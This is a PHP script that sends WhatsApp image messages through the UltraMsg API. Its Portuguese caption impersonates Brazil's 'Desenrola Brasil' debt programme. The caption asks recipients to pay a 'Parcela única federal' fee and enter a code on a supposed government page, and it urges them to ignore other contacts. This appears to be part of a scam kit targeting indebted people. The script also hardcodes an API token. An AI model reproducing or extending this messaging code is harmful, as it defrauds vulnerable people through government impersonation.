<?php
require '../../vendor/autoload.php';
// Verifica se o script foi chamado com o método POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $filePath = 'welcome_message.png';
    $imageData = file_get_contents($filePath);
    $base64EncodedData = base64_encode($imageData);

    header('Content-Type: application/json');
    $path = basename($_SERVER['PHP_SELF']);
    if ($path === 'send_welcome_message.php') {
        // Obtendo o corpo da requisição
        $data = json_decode(file_get_contents('php://input'), true);

        // Validação simples dos dados
        if (isset($data['phoneNumber']) && isset($data['random_code'])) {
            require_once 'HTTP/Request2.php';

            $params = array(
                'token' => 'cyywaz7u51k04w77',
                'to' => $data['phoneNumber'],
                'image' => $base64EncodedData,
                'caption' => "Olá! Bem-vindo(a) ao *Desenrola Brasil!* 🎉 🇧🇷\n\n*SEU CÓDIGO É*:".$data['random_code']."\n\nEstamos aqui para apoiá-lo(a) na renegociação das suas dívidas, oferecendo uma oportunidade única de reconquistar sua saúde financeira apenas com o pagamento de uma *PUF* (Parcela única federal). Este é um grande passo em direção a uma vida financeira mais saudável e tranquila. Não se preocupe, você não precisa responder a esta mensagem.\n\nEm breve, enviaremos um código exclusivo. Por favor, insira este código na página oficial do governo onde você iniciou sua solicitação. Após a inserção correta do código, sua Parcela Única Federal (*PUC*) será gerado automaticamente.\n\n*QUAISQUER OUTRAS TENTATIVAS DE CONTATO PROVENIENTES DE INTERMÉDIO PESSOA FÍSICA, DEVERÃO SER EVITADAS. TODO O SISTEMA É AUTOMATIZADO, HUMANIZADO E DIREITO DE TODO CIDADÃO BRASILEIRO, NOSSO MEIO DE VERIFICAÇÃO É VIA CÓDIGO E APENAS ISSO, QUALQUER OUTRO MEIO DE ESTABELECER UMA COMUNICAÇÃO INDIRETA DEVERÁ SER REPUDIADO. O CÓDIGO GERADO É ÚNICO, NÃO DEVERÁ SER COMPARTILHADO, E ESTARÁ DISPONÍVEL PARA CADA CADASTRO PESSOA FÍSICA.*"
            );
            

            $request = new HTTP_Request2();
            $request->setUrl('https://api.ultramsg.com/instance83056/messages/image');
            $request->setMethod(HTTP_Request2::METHOD_POST);
            $request->setConfig(array(
                'follow_redirects' => TRUE
            ));
            $request->setHeader(array(
                'Content-Type' => 'application/x-www-form-urlencoded'
            ));
            foreach ($params as $key => $value) {
                $request->addPostParameter($key, $value);
            }

            try {
                $response = $request->send();
                if ($response->getStatus() == 200) {
                    echo $response->getBody();
                } else {
                    echo json_encode(array('error' => 'Unexpected HTTP status: ' . $response->getStatus() . ' ' . $response->getReasonPhrase()));
                }
            } catch (HTTP_Request2_Exception $e) {
                echo json_encode(array('error' => 'Error: ' . $e->getMessage()));
            }
        } else {
            echo json_encode(array('error' => 'Missing required parameters.'));
        }
    } else {
        // Não é a rota esperada
        http_response_code(404);
        echo json_encode(array('error' => 'Not found'));
    }
} else {
    // Método não permitido
    http_response_code(405);
    echo json_encode(array('error' => 'Method not allowed'));
}
